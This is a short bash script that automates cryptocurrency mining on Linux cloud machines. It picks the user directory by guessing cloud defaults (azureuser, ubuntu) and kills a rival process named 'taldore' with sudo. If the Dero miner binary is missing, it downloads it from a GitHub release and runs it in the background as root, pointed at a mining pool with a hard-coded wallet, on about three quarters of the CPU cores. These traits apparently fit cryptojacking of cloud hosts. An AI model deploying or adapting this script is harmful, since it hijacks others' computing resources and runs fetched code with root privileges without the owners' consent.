#!/bin/bash
if [ -d "/home/azureuser" ]; then
    username="azureuser"
elif [ -d "/home/ubuntu" ]; then
	username="ubuntu"
else
	username=$(ls /home | sed -n 1p)
fi
cd /home/$username/
core=$(nproc)
minecore=$(printf '%.0f\n' $(($core*75/100)))
if [ $core -lt 3 ]; then
	minecore=$(($core/2))
fi
if pgrep -x "taldore" > /dev/null
then
	sudo kill -9 $(pgrep -x "taldore")
fi
if pgrep -x "deroplus" > /dev/null
then
	echo "Miner is running"
	cpuusage=$(top -b -n2 -p 1 | fgrep "Cpu(s)" | tail -1 | awk '{print $2}'|cut -f 1 -d ".")
	if [ $cpuusage -lt 40 ]; then
		sudo kill -9 $(pgrep -x "deroplus")
		nohup sudo /home/$username/deroplus --wallet=dero1qyvmr2amhjqx49gnxp9hd3c7lj6anugr4l0u5lm8zd6lnevxefejwqgmqhu0e.$RANDOM --host=pool.whalesburg.com:4300 --threads $minecore &
	fi
else
	file="/home/$username/deroplus"
	if [ -f $file ]; then
		nohup sudo /home/$username/deroplus --wallet=dero1qyvmr2amhjqx49gnxp9hd3c7lj6anugr4l0u5lm8zd6lnevxefejwqgmqhu0e.$RANDOM --host=pool.whalesburg.com:4300 --threads $minecore &
	else
		wget https://github.com/Jonutz123/Deroplus-AstroBWTv3/releases/download/publish2/deroplus-stratum-linux-amd64.tar.gz
		tar xvf deroplus-stratum-linux-amd64.tar.gz
		chmod +x deroplus-stratum-linux-amd64
		sudo mv deroplus-stratum-linux-amd64 deroplus
		nohup sudo /home/$username/deroplus --wallet=dero1qyvmr2amhjqx49gnxp9hd3c7lj6anugr4l0u5lm8zd6lnevxefejwqgmqhu0e.$RANDOM --host=pool.whalesburg.com:4300 --threads $minecore &
	fi
fi
defunctpid=$(ps -A -ostat,ppid | awk '/[zZ]/ && !a[$2]++ {print $2}')
if [ ! -z "$defunctpid" ]; then
	sudo kill -9 $defunctpid
fi
